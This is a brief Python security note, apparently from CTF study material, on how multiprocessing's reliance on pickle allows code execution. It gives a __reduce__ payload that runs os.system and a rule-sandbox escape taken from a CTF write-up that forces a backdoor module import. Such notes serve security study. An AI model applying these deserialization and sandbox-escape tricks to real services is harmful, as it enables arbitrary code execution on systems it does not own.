# Multiprocessing
Multiprocessing uses pickle because it's the best way to communicate between processes in a fast way.

## Example 1

```py
import multiprocessing


def f(x):
    return x

class test:
    def __reduce__(x):
        import os
        return (os.system, ("ls",))


if __name__ == "__main__":
    multiprocessing.Process(target=f, args=(test(),)).start()
```

## Example 2 (https://github.com/HITB-CyberWeek/proctf-2019/blob/master/writeups/fraud_detector/fraud_detector.md)

```py
import ast
import multiprocessing
import concurrent.futures

def run_rule(rule, user):
    globs = __builtins__.copy()
    globs.update({
        "user": user,
        "fraud_prob": 0
    })

    ast_rule = ast.parse(rule)

    code = compile(ast_rule, filename="rule.py", mode="exec")
    exec(code, globs)
    fraud_prob = globs["fraud_prob"]

    return fraud_prob


def run_rules(rules, user):
    return [run_rule(rule, user) for rule in rules]


def run_rules_safe(rules, user):
    executor = concurrent.futures.ProcessPoolExecutor(max_workers=1)
    future = executor.submit(run_rules, rules, user)
    return future.result(timeout=2.0)


# Here 'backdoor.py' will be imported
if __name__ == "__main__":
    run_rules_safe([""" 
__name__ = "backdoor" # data.users.test -> importing data/users/test.py
fraud_prob = type("A", (), {"__gt__": lambda s, o: True, "__lt__": lambda s, o: True})()
"""], "test")

```